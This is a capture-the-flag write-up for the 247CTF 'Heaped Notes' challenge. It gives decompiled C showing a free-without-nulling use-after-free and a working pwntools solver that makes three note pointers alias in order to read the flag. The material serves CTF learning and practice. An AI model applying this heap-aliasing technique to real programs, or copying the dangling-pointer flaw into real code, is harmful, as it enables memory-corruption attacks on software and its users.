# HEAPED NOTES [EASY]

## Description

> Can you abuse our heaped notes service to create 3 identical notes?

## Short Solution Description / Tags

Use After Free

## Basic file checks

```console
$ file heaped_notes
heaped_notes: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d03f46baabb631bdb9207a853debc485ed5efea7, stripped

$ checksec heaped_notes
[*] '/root/Desktop/heaped_notes'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Decompiled

```c
void FUN_00100aef(void)

{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Enter the size of your small note:");
  __isoc99_scanf(&DAT_0010111b,&local_14);
  getchar();
  if ((local_14 < 1) || (0x20 < local_14)) {
    puts("Invalid small note size");
    if (DAT_00302030 != (char *)0x0) {
      free(DAT_00302030);
    }
  }
  else {
    DAT_00302030 = (char *)malloc((long)(local_14 + 1));
    puts("Enter small note data:");
    fgets(DAT_00302030,local_14,stdin);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}


void FUN_00100bbc(void)

{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Enter the size of your medium note:");
  __isoc99_scanf(&DAT_0010111b,&local_14);
  getchar();
  if ((local_14 < 1) || (0x40 < local_14)) {
    puts("Invalid medium note size");
    if (DAT_00302038 != (char *)0x0) {
      free(DAT_00302038);
    }
  }
  else {
    DAT_00302038 = (char *)malloc((long)(local_14 + 1));
    puts("Enter medium note data:");
    fgets(DAT_00302038,local_14,stdin);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}


void FUN_00100c89(void)

{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Enter the size of your large note:");
  __isoc99_scanf(&DAT_0010111b,&local_14);
  getchar();
  if ((local_14 < 1) || (0x80 < local_14)) {
    puts("Invalid large note size");
    if (DAT_00302040 != (char *)0x0) {
      free(DAT_00302040);
    }
  }
  else {
    DAT_00302040 = (char *)malloc((long)(local_14 + 1));
    puts("Enter large note data:");
    fgets(DAT_00302040,local_14,stdin);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

```c
void FUN_00100d58(void)

{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if ((((DAT_00302030 == 0) || (DAT_00302038 == 0)) || (DAT_00302040 == 0)) ||
     ((DAT_00302030 != DAT_00302038 || (DAT_00302038 != DAT_00302040)))) {
    puts("Sorry, flag is currently unavailable");
  }
  else {
    __stream = fopen("flag.txt","r");
    fgets(local_58,0x40,__stream);
    puts(local_58);
    fclose(__stream);
  }
...
```

## Solution

solver.py

```python
from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "split-window", "-h"]

elf = ELF("./heaped_notes", checksec=False)


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("9041a3a511beeeb8.247ctf.com", 50428)

    else:
        with open("flag.txt", "w") as f:
            f.write("dummy flag")
        io = elf.process()

    return io


def create_valid_note(io, type, size, msg):
    io.sendlineafter(b"command:", type.encode())
    io.sendlineafter(b"note:", size.encode())
    io.sendlineafter(b"note data:", msg.encode())


def create_invalid_note(io, type, size, msg):
    io.sendlineafter(b"command:", type.encode())
    io.sendlineafter(b"note:", size.encode())
    recv = io.recvuntilS(b"note size")
    assert "Invalid" in recv


def main():
    # payload = b""

    io = conn()

    create_valid_note(io, "small", "5", "aa\n")
    create_invalid_note(io, "small", "0", "aa\n")

    create_valid_note(io, "medium", "5", "bb\n")
    create_invalid_note(io, "medium", "0", "bb\n")

    create_valid_note(io, "large", "5", "cc\n")

    io.sendlineafter(b":", b"print")

    io.sendlineafter(b":", b"flag")

    io.interactive("")


if __name__ == "__main__":
    main()
```

Result:

```console
$ python3 solver.py REMOTE
[+] Opening connection to 9041a3a511beeeb8.247ctf.com on port 50428: Done
(snip)
247CTF{[REDACTED]}
```

## References

- [CWE - CWE-416: Use After Free (4.13)](https://cwe.mitre.org/data/definitions/416.html)
- [Using freed memory \| OWASP Foundation](https://owasp.org/www-community/vulnerabilities/Using_freed_memory)
